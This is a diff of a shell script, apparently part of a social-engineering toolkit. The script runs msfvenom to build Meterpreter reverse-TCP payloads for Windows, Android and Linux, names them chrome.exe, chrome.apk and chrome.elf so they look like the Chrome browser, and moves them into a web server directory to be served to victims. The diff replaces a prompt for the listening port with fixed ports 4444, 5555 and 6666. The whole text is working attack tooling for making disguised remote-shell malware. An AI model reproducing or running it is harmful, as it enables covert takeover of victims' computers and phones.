@@ -8,23 +8,21 @@ read -p "Enter your LHOST: " host
 echo
 read -p "Enter your full apache server path: " path
 echo
-read -p "Enter your LPORT: " port
-echo
 read -p "Enter system type (x86,x64): " types
 echo
 echo "[*]Startng msfvenom"
 sleep 0.5
 echo "[*]Making Windows payload"
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port >/root/.SEF/chrome.exe 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=4444 >/root/.SEF/chrome.exe 
 mv /root/.SEF/chrome.exe $path
 echo "[*]Setting up server"
 echo
 echo "[*]Making Android payload"
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port  >/root/.SEF/chrome.apk 
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=5555  >/root/.SEF/chrome.apk 
 mv /root/.SEF/chrome.apk $path
 echo "[*]Setting up server"
 echo "[*]Making Linux payload"
-msfvenom -p linux/$types/meterpreter/reverse_tcp LHOST=$host LPORT=$port  >/root/.SEF/chrome.elf
+msfvenom -p linux/$types/meterpreter/reverse_tcp LHOST=$host LPORT=6666  >/root/.SEF/chrome.elf
 mv /root/.SEF/chrome.elf $path
 echo "[*]Setting up server"
 opreation=$?
